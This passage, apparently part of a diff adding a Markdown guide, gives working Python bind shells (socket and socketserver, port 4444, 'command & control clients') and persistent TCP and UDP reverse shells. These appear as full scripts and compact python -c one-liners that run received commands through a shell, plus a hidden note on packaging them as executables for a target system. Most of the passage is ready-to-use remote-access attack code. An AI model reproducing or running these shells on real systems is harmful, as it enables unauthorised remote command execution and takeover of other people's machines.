+    with socket.create_server((HOST, PORT), family=fam, dualstack_ipv6=dual) as bshell:
+        host, port, *_ = bshell.getsockname()
+        print(f"Binding: {host}:{port}")
+        
+        # infinitely accept new command & control clients
+        while True:
+            clientSocket, (ip, port, *_) = bshell.accept()
+            print(f"{ip}:{port}> joined ...")
+            
+            Thread(target=client_handler, args=(clientSocket, ip, port)).start()
+
+def client_handler(clientSocket, ip, port):
+    with clientSocket:
+        _spawn(clientSocket, ip, port, True) # function, remove self.
+
+if __name__ == "__main__":
+    bind_shell()
+```
+
+# Bind Shell (SocketServer)
+
+Socketserver with the ThreadingMixIn allows us to achieve a multithreaded bindshell using this module.
+
+```python
+from subprocess import Popen, PIPE, STDOUT
+import socketserver
+
+HOST, PORT = '', 4444
+
+def bind_shell():
+    with ThreadedTCPServer((HOST, PORT), ThreadedBindHandler) as bshell:
+        ip, port = bshell.server_address
+        print(f"Binding to: {ip}:{port}")
+        bshell.daemon = True
+        bshell.serve_forever()
+
+class ThreadedBindHandler(socketserver.BaseRequestHandler):
+    # """
+    # Instantiated once per connection to bshell and must override 
+    # the handle() method to implement communication to the client.
+    # """
+
+    def handle(self):
+        ip, port = self.client_address
+        print(f"{ip}:{port}> joined ...")
+        
+        spawn_shell(self.request, ip, port, True)
+        
+class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
+    pass
+
+if __name__ == "__main__":
+    try:
+        bind_shell()
+    except KeyboardInterrupt:
+        print("ctrl+c")
+```
+
+<!-- ## **Encrypted Communications**
+
+- # Client
+    ```python
+    
+    ```
+
+- # Server
+    ```python
+
+    ``` -->
+
+## **Command Line**
+
+The command line requires that we invent a one line solution so we have to rethink our design a bit. This is the most succinct `persistent reverse shell` that I could come up with at the moment of this writing. The backbone of the infinite loop is this snippet: `[print(_) for _ in iter(int, 1)]`, because int() always returns 0 and the sentinel value is 1 which is never met, we have created an infinite for loop list comprehension that will work in a one-liner. 
+
+Remember that `socket()` defaults to AF_INET (IPv4) and SOCK_STREAM (TCP) so we don't need to waste space in our string importing and using those properties. We've also taken advantage of setting stderr to STDOUT which indicates that the stderr data from the application should be captured into the same file handle as stdout. This saves more space now that we don't have to append proc.stderr.read().
+
+Because sockets are `automatically closed when they are garbage-collected`, despite the fact that it is recommended to use `with` or `close()`, we could probably neglect their use in this context.
+
+# Reverse Shell
+
+```python
+from socket     import *
+from subprocess import *
+
+# @infinite
+def reverse_shell():
+    s = socket()
+    s.connect(('127.0.0.1', 4444))
+    # s = create_connection(('127.0.0.1', 4444))
+    [ 
+        s.send(
+            Popen(
+                args=str(s.recv(512), 'ascii'),
+                stdout=PIPE,stderr=STDOUT,shell=True
+            ).stdout.read()
+        ) for _ in iter(int, 1) #..iter(lambda:0, 1) also
+    ]
+    # s.close() relying on garbage collector to shorten code
+
+if __name__ == "__main__":
+    reverse_shell()
+```
+
+```python
+python -c "from socket import *;from subprocess import *;s = socket();s.connect(('127.0.0.1', 4444));[s.send(Popen(args=str(s.recv(512), 'ascii'),stdout=PIPE,stderr=STDOUT,shell=True).stdout.read()) for _ in iter(int, 1)];"
+```
+
+```python
+python -c "from socket import *;from subprocess import *;s = create_connection(('127.0.0.1', 4444));[s.send(Popen(args=str(s.recv(512), 'ascii'),stdout=PIPE,stderr=STDOUT,shell=True).stdout.read()) for _ in iter(int, 1)];"
+```
+
+# Reverse Shell (UDP)
+
+```python
+from subprocess import *
+from socket     import *
+
+@infinite
+def reverse_shell_udp():
+    ADDR = ('127.0.0.1', 4444)
+    s = socket(type=SOCK_DGRAM)
+    s.sendto(b': ', ADDR) 
+    [
+        s.sendto(
+            Popen(
+                args = str(s.recvfrom(512)[0], 'ascii'),
+                stdout = PIPE, stderr = STDOUT, shell = True
+            ).stdout.read(),
+            ADDR
+        ) for _ in iter(int, 1) 
+    ]
+    
+if __name__ == "__main__":
+    reverse_shell_udp()
+```
+
+```python
+python -c "from subprocess import *;from socket import *;ADDR = ('127.0.0.1', 4444);s = socket(type=SOCK_DGRAM); s.sendto(b': ', ADDR);[s.sendto(Popen(args = str(s.recvfrom(512)[0], 'ascii'),stdout = PIPE, stderr = STDOUT, shell = True).stdout.read(), ADDR) for _ in iter(int, 1)]"
+```
+
+<!-- ## **Pyinstaller**
+
+You can generate an executable from python programs using [pyinstaller](https://www.pyinstaller.org/)
+
+> "PyInstaller freezes (packages) Python applications into stand-alone executables, under Windows, GNU/Linux, Mac OS X, FreeBSD, Solaris and AIX."
+
+This will allow you to turn anyone of these shells into a standalone executable that can be run without having to install the python interpreter on the target system. -->
